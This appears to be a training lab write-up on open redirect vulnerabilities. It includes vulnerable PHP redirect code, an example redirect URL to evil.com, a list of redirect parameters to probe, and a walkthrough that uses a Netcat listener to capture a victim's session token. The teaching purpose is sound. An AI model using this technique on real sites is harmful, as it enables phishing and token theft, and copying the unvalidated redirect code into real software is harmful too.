An Open Redirect vulnerability occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate application's redirection functionality. In such cases, all the attacker has to do is specify a website under their control in a redirection URL of a legitimate website and pass this URL to the victim. As you can imagine, this is possible when the legitimate application's redirection functionality does not perform any kind of validation regarding the websites to which the redirection points. From an attacker's perspective, an open redirect vulnerability can prove extremely useful during the initial access phase since it can lead victims to attacker-controlled web pages through a page that they trust.

Let us take a look at some code.

```php
$red = $_GET['url'];
header("Location: " . $red);
```

```php
$red = $_GET['url'];
```

In the line of code above, a variable calledÂ _red_Â is defined that gets its value from a parameter calledÂ _url_.Â _$_GET_Â is a PHP superglobal variable that enables us to access theÂ _url_Â parameter value.

```php
header("Location: " . $red);
```

The Location response header indicates the URL to redirect a page to. The line of code above sets the location to the value ofÂ _red_, without any validation. We are facing an Open Redirect vulnerability here.

The malicious URL an attacker would send leveraging the Open Redirect vulnerability would look as follows:Â `trusted.site/index.php?url=https://evil.com`

Make sure you check for the following URL parameters when bug hunting, you'll often see them in login pages. Example:Â `/login.php?redirect=dashboard`

```ad-important
- ?url=
- ?link=
- ?redirect=
- ?redirecturl=
- ?redirect_uri=
- ?return=
- ?return_to=
- ?returnurl=
- ?go=
- ?goto=
- ?exit=
- ?exitpage=
- ?fromurl=
- ?fromuri=
- ?redirect_to=
- ?next=
- ?newurl=
- ?redir=
```

---

## Open Redirect Example

Navigate toÂ `oredirect.htb.net`. You will come across a URL of the below format:

`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

If you enter an email account, you will notice that the application is eventually making a POST request to the page specified in theÂ _redirect_uri_Â parameter. AÂ _token_Â is also included in the POST request. This token could be a session or anti-CSRF token and, therefore, useful to an attacker.

![image](https://academy.hackthebox.com/storage/modules/153/72.png)

Let us test if we can control the site where theÂ _redirect_uri_Â parameter points to. In other words, let us check if the application performs the redirection without any kind of validation (Open Redirect).

We can test that as follows.

First, let us set up a Netcat listener.

```shell-session
smoothment@htb[/htb]$ nc -lvnp 1337
```

Copy the entire URL where you landed after navigating toÂ `oredirect.htb.net`. It should be a URL of the below format:

`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

Then, edit this URL as follows.

`http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

`<RANDOM TOKEN ASSIGNED BY THE APP>`Â <-- Replace this with the token that is assigned automatically by the application.

Open aÂ `New Private Window`Â and navigate to the link above to simulate the victim.

When the victim enters their email, we notice a connection being made to our listener. The application is indeed vulnerable to Open Redirect. Not only that, but the captured request captured also includes the token!

![image](https://academy.hackthebox.com/storage/modules/153/71.png)

Open redirect vulnerabilities are usually exploited by attackers to create legitimate-looking phishing URLs. As we just witnessed, though, when a redirection functionality involves user tokens (regardless of GET or POST being used), attackers can also exploit open redirect vulnerabilities to obtain user tokens.

The following section will provide some prevention advice related to the covered vulnerabilities.

# Question
---


![Pasted image 20250219131152.png](../../../../IMAGES/Pasted%20image%2020250219131152.png)

